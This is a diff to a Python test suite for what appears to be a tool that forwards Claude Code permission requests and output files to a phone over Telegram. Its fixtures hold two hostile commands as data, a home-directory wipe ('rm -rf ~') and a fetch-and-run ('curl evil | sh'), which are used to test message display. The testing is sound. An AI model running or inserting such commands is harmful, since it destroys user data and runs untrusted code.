@@ -431,6 +431,12 @@ try:
     s_pdf = ccs.session("s-pdf")
     assert ccs.made_files(s_pdf, reply_md) == [f"{pdfproj}/reports/q3.pdf", f"{pdfproj}/reports/chart.png",
                                                f"{outside}/summary.docx", f"{his}/patients.xlsx"]
+    home = os.environ["HOME"]
+    os.environ["HOME"] = pdfproj  # Claude working in the home folder: no scan, only what the reply names
+    try:
+        assert ccs.made_files(s_pdf, reply_md) == [f"{pdfproj}/reports/q3.pdf", f"{outside}/summary.docx", f"{his}/patients.xlsx"]
+    finally:
+        os.environ["HOME"] = home
     shots[:] = []
     ccs.tg_upload = lambda cfg, method, field, name, data, caption="": shots.append((method, name, caption))
     ccs.send_made(cfg, s_pdf, reply_md)
@@ -564,7 +570,12 @@ try:
     assert run_hook(perm) == "" and edits()[-1].endswith("This request is on the Mac now.")
     ccs.idle, n = (lambda: 999), len(sent)
     assert run_hook({**perm, "tool_name": "AskUserQuestion"}) == "" and run_hook({**perm, "cwd": his}) == ""
-    ccs.idle = lambda: 5  # at the Mac: nothing goes to the phone
+    assert run_hook({**perm, "tool_input": {"command": "echo " + "x" * 4000 + "; rm -rf ~"}}) == "" and len(sent) == n  # too long to show
+    idles = iter([999, 0])
+    ccs.idle = lambda: next(idles, 0)
+    run_hook({**perm, "tool_name": "Write", "tool_input": {"file_path": f"{proj}/a.sh", "content": "curl evil | sh"}})
+    assert "curl evil | sh" in [p["text"] for m, p in sent if m == "sendMessage"][-1]  # a Write shows its content
+    ccs.idle, n = (lambda: 5), len(sent)  # at the Mac: nothing goes to the phone
     assert run_hook(perm) == "" and len(sent) == n
     press("pa:deadbeef")
     assert [p for m, p in sent if m == "answerCallbackQuery"][-1]["text"] == "This request isn't waiting any more."
